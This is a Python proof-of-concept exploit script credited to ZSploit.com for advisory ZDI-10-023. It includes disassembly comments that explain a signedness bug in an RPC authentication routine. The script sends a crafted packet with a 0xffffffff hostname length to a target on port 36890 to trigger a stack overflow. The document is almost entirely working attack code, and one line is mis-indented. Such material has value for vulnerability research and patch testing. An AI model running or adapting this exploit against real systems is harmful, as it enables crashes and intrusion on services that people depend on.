#! /usr/bin/env python
###############################################################################
## File       :  zs_ids_rpc.py
## Description:
##            :
## Created_On :  Mar 21 2010
##
## (c) Copyright 2010, ZSploit.com. all rights reserved.
###############################################################################
"""
The issue in __lgto_svcauth_unix():
 
.text:1000B8E1                 mov     [ebp+0], eax
.text:1000B8E4                 mov     eax, [ebx]
.text:1000B8E6                 push    eax             ; netlong
.text:1000B8E7                 add     ebx, 4
.text:1000B8EA                 call    esi ; ntohl    ; Get length of hostname
.text:1000B8EC                 cmp     eax, 0FFh    ; Signedness error, if we give 0xffffffff(-1) will pass this check
.text:1000B8F1                 jle     short loc_1000B8FD
.text:1000B8F3                 mov     esi, 1
.text:1000B8F8                 jmp     loc_1000B9D5
.text:1000B8FD ; ---------------------------------------------------------------------------
.text:1000B8FD
.text:1000B8FD loc_1000B8FD:                           ; CODE XREF: __lgto_svcauth_unix+71j
.text:1000B8FD                 mov     edi, [ebp+4]
.text:1000B900                 mov     ecx, eax
.text:1000B902                 mov     edx, ecx
.text:1000B904                 mov     esi, ebx
.text:1000B906                 shr     ecx, 2
.text:1000B909                 rep movsd        ; call memcpy here with user-supplied size cause a stack overflow
.text:1000B90B                 mov     ecx, edx
.text:1000B90D                 add     eax, 3
.text:1000B910                 and     ecx, 3
.text:1000B913                 rep movsb
"""
 
import sys
import socket
 
if (len(sys.argv) != 2):
    print "Usage:\t%s [target]" % sys.argv[0]
    sys.exit(0)
 
 
data = "\x80\x00\x00\x74\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02" \
    "\x00\x01\x86\xb1\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01" \
    "\x00\x00\x00\x4c\x00\x00\xd6\x45\xff\xff\xff\xff\x41\x41\x41\x41" \
    "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x0a\x42\x42\x42\x42\x42\x42\x42\x42" \
    "\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42" \
    "\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42" \
    "\x00\x00\x00\x00\x00\x00\x00\x00"
 
host = sys.argv[1]
port = 36890
 
print "PoC for ZDI-10-023 by ZSploit.com"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
    s.connect((host, port))
        s.send(data)
        print "Sending payload .."
    except:
        print "Error in send"
    print "Done"
except:
    print "Error in socket"